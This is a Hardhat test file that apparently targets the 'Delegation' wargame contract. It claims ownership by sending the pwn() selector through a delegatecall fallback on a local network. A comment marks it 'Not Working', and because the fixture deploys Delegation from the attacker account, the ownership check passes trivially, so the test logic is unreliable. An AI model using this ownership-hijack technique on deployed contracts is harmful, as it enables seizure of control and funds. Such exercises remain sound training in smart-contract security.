import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { Interface } from "ethers/lib/utils";
import { ethers } from "hardhat";

// Not Working
describe("Delegation exploit", () => {
  async function deployDelegationFixture() {
    const [deployer, attacker] = await ethers.getSigners();

    // Deploy Delegate contract. Pass address(0) as the constructor parameter. This is how DelegationFactory deploys the instance
    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(ethers.constants.AddressZero);

    // Deploy Delegation contract. Pass Delegate contract address as the constructor parameter
    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = await Delegation.connect(attacker).deploy(delegate.address);

    return { attacker, delegation };
  }

  it("Should claim ownership", async () => {
    const { attacker, delegation } = await loadFixture(deployDelegationFixture);

    const abi = ["function pwn() public"];
    const iface = new Interface(abi);
    const selector = iface.getSighash("pwn()");

    const tx = await attacker.sendTransaction({
      to: delegation.address,
      data: selector,
    });

    await tx.wait();

    const newOwner = await delegation.owner();

    // Check if the owner is set.
    expect(newOwner).to.be.equal(attacker.address, "Failed!!!");
  });
});
